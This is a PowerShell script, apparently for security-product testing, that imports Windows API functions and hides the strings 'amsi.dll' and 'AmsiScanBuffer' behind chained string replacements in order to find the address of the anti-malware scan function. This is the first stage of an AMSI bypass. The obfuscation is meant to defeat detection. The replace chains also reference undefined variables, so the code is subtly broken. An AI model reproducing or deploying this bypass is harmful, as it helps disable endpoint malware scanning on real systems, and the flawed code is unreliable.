# Define named parameters
$InitialStart = 0x50000
$NegativeOffset= 0x50000
$MaxOffset = 0x4000000
$ReadBytes = 0x50000


$APIs = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
   	 return 1;
    }
}
"@

Add-Type $APIs

$InitialDate=Get-Date;
$string4 = 'vectra testing'

$hello = 'hello, world'
$hello = $string.replace('he','a')
$hello = $string.replace('ll','m')
$hello = $string.replace('o,','s')
$hello = $string.replace(' ','i')
$hello = $string.replace('wo','.d')
$hello = $string.replace('rld','ll')

$hello2 = 'hello, world'
$hello2 = $string2.replace('he','A')
$hello2 = $string2.replace('ll','m')
$hello2 = $string2.replace('o,','s')
$hello2 = $string2.replace(' ','i')
$hello2 = $string2.replace('wo','Sc')
$hello2 = $string2.replace('rld','an')

$hello3 = 'hello, world'
$hello3 = $string3.replace('hello','Bu')
$hello3 = $string3.replace(', ','ff')
$hello3 = $string3.replace('world','er')

$Address = [APIS]::GetModuleHandle($hello)
[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $hello2 + $hello3)
